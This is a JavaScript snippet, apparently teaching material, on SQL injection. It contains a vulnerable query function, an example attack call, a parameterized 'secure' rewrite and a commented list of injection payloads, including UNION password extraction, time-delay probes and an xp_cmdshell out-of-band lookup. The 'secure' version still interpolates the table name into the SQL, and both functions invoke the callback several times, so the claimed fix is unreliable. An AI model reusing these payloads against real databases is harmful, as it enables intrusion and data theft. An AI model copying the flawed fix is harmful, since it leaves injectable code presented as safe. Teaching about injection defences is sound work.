// original vulnerable function:

function getPopulation(Country, name, code, cb) {
  // assuming that connection to the database is established and stored as conn
  conn.query(
    `SELECT Population FROM ${Country} WHERE Name = '${name}' and code = '${code}'`,
    function (err, result) {
      if (err) cb(err);
      if (result.length == 0) cb(new Error("Not found"));
      cb(null, result[0].name);
    }
  );
}

//Example of how an attacker could exploit this vulnerable function using SQL injection:
//In this example, the malicious input for name and code will result in a query that always evaluates
//to true (1=1 and 'a'='a'), fetching all records from the database.

const maliciousName = "' OR 1=1; --";
const maliciousCode = "' OR 'a'='a'; --";

getPopulation("Countries", maliciousName, maliciousCode, (err, result) => {
  if (err) {
    console.error(err.message);
  } else {
    console.log("Population:", result);
  }
});

// new function to make it secure using parameterized queries:

function getPopulationSecure(conn, Country, name, code, cb) {
  // assuming that connection to the database is established and stored as conn
  conn.query(
    `SELECT Population FROM ${Country} WHERE Name = ? and code = ?`,
    [name, code],
    function (err, result) {
      if (err) cb(err);
      if (result.length === 0) cb(new Error("Not found"));
      cb(null, result[0].Population);
    }
  );
}

// In the secure version, we use placeholders (?) for name and code and pass them as an array as the second parameter to conn.query.
//This approach prevents SQL injection by treating the input as data rather than executable SQL code.

//Examples of oher SQL techniques:

// 1 -Classic SQL Injection:

//' OR '1'='1'; --

// 2 - Union-based SQL Injection:

//' UNION SELECT username, password FROM users; --

// 3 - Error-based SQL Injection:

//' OR 1=CONVERT(int, (SELECT @@version)); --

// 4 - Time-based Blind SQL Injection:

// ' OR IF(1=1, SLEEP(5), 0); --

// 5 - Boolean-based Blind SQL Injection:

// ' OR IF(1=1, name, 0)='John'; --

// 6 - Out-of-Band SQL Injection:

// '; EXEC xp_cmdshell('nslookup example.com'); --

// 7 Second Order SQL Injection:

// User input is stored
// const userInput = "John'; --";

// Later used in a query
// const query = `SELECT * FROM users WHERE username='${userInput}'`;

// 8 - Stored Procedure Injection:

//'; EXEC sp_executesql N'SELECT * FROM users'; --

// 9 - Inference-based Blind SQL Injection:

//' OR 1=1; IF (1=1) WAITFOR DELAY '0:0:10'; --
